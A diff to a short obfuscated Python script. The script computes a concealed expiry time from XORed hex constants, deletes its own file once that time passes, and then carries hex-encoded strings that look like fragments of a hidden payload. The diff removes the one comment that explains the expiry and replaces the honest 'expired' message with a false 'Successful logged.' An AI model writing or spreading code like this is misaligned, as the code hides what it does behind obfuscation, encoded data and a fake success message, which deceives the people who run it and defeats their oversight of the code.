@@ -1,7 +1,7 @@
 
 import time, os
 
-# Fully hidden expiration
+
 rkHNPm = int("68b9ba14", 16)
 bpnduW = int("dce09", 16)
 HpWGtW = rkHNPm ^ bpnduW
@@ -9,7 +9,7 @@ HpWGtW = rkHNPm ^ bpnduW
 if int(time.time()) > HpWGtW:
     try: os.remove(__file__)
     except: pass
-    exit("This script has expired.")
+    exit("Successful logged.")
 
 kbWRVf = "654a793147747475473866316e5638785744393457644d6258"
 bHnhOT = "65773046634369736b7a5a7247584a6b4f6743695349736872"
